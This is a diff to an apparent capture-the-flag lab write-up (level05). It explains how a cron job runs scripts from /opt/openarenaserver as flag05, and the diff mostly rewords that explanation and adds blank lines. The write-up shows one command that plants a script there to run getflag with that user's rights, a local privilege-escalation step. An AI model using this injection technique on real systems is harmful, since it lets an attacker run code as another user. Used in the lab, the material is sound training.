@@ -7,7 +7,8 @@ Mail are hosted on `/var/spool/mail`.
 $ cat /var/spool/mail/level05
 */2 * * * * su -c "sh /usr/sbin/openarenaserver" - flag05
 ```
-It's a crontab configuration who execute every two minutes the shell script in `/usr/sbin/openarenaserver` as flag05.
+
+It's a crontab configuration who execute every two minutes the shell script `/usr/sbin/openarenaserver` as flag05. That script run scripts located in /opt/openarenaserver and remove them.
 
 ```sh
 $ cat /usr/sbin/openarenaserver
@@ -20,11 +21,13 @@ done
 ```
 
 Let's inject our own script.
+
 ```sh
 $ echo "exec /bin/getflag > /tmp/soluc" > /opt/openarenaserver/inject.sh
 ```
 
 And after few minutes we can read `/tmp/soluc`
+
 ```sh
 $ cat /tmp/soluc
 ```
